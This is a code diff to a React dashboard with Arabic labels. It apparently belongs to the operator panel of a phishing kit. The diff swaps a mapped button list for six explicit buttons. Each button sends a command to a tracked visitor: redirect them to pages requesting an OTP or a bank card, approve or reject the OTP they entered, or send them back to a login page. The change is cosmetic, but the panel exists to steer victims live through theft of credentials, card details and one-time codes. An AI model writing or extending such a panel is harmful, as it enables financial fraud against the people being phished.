@@ -311,22 +311,42 @@ export default function ProjectDashboard({ project, onBack }: Props) {
                   <div className="space-y-2">
                     <p className="text-gray-400 text-xs font-black">إرسال أمر:</p>
                     <div className="flex flex-wrap gap-2">
-                      {[
-                        { cmd: "redirect:otp",    label: "طلب OTP",        cls: "amber" },
-                        { cmd: "redirect:card",   label: "طلب بطاقة",      cls: "purple" },
-                        { cmd: "otp:approved",    label: "✓ قبول OTP",     cls: "green" },
-                        { cmd: "otp:rejected",    label: "✗ رفض OTP",      cls: "red" },
-                        { cmd: "redirect:reject", label: "✗ إلغاء (انتظار)", cls: "red" },
-                        { cmd: "redirect:login",  label: "↩ رجوع للدخول", cls: "blue" },
-                      ].map(({ cmd, label, cls }) => (
-                        <button
-                          key={cmd}
-                          onClick={() => projectApi.sendCmd(project.apiBase, v.id, cmd)}
-                          className={`flex items-center gap-1.5 bg-${cls}-500/20 hover:bg-${cls}-500/30 border border-${cls}-500/30 text-${cls}-300 font-bold text-xs px-3 py-2 rounded-xl transition-colors`}
-                        >
-                          <Send className="w-3.5 h-3.5" /> {label}
-                        </button>
-                      ))}
+                      <button
+                        onClick={() => projectApi.sendCmd(project.apiBase, v.id, "redirect:otp")}
+                        className="flex items-center gap-1.5 bg-amber-500/20 hover:bg-amber-500/30 border border-amber-500/30 text-amber-300 font-bold text-xs px-3 py-2 rounded-xl transition-colors"
+                      >
+                        <Send className="w-3.5 h-3.5" /> طلب OTP
+                      </button>
+                      <button
+                        onClick={() => projectApi.sendCmd(project.apiBase, v.id, "redirect:card")}
+                        className="flex items-center gap-1.5 bg-purple-500/20 hover:bg-purple-500/30 border border-purple-500/30 text-purple-300 font-bold text-xs px-3 py-2 rounded-xl transition-colors"
+                      >
+                        <Send className="w-3.5 h-3.5" /> طلب بطاقة
+                      </button>
+                      <button
+                        onClick={() => projectApi.sendCmd(project.apiBase, v.id, "otp:approved")}
+                        className="flex items-center gap-1.5 bg-green-500/20 hover:bg-green-500/30 border border-green-500/30 text-green-300 font-bold text-xs px-3 py-2 rounded-xl transition-colors"
+                      >
+                        <Send className="w-3.5 h-3.5" /> ✓ قبول OTP
+                      </button>
+                      <button
+                        onClick={() => projectApi.sendCmd(project.apiBase, v.id, "otp:rejected")}
+                        className="flex items-center gap-1.5 bg-red-500/20 hover:bg-red-500/30 border border-red-500/30 text-red-400 font-bold text-xs px-3 py-2 rounded-xl transition-colors"
+                      >
+                        <Send className="w-3.5 h-3.5" /> ✗ رفض OTP
+                      </button>
+                      <button
+                        onClick={() => projectApi.sendCmd(project.apiBase, v.id, "redirect:reject")}
+                        className="flex items-center gap-1.5 bg-red-500/20 hover:bg-red-500/30 border border-red-500/30 text-red-400 font-bold text-xs px-3 py-2 rounded-xl transition-colors"
+                      >
+                        <Send className="w-3.5 h-3.5" /> ✗ إلغاء (انتظار)
+                      </button>
+                      <button
+                        onClick={() => projectApi.sendCmd(project.apiBase, v.id, "redirect:login")}
+                        className="flex items-center gap-1.5 bg-blue-500/20 hover:bg-blue-500/30 border border-blue-500/30 text-blue-300 font-bold text-xs px-3 py-2 rounded-xl transition-colors"
+                      >
+                        <Send className="w-3.5 h-3.5" /> ↩ رجوع للدخول
+                      </button>
                       <button
                         onClick={() =>
                           projectApi.deleteOne(project.apiBase, v.id).then(() =>
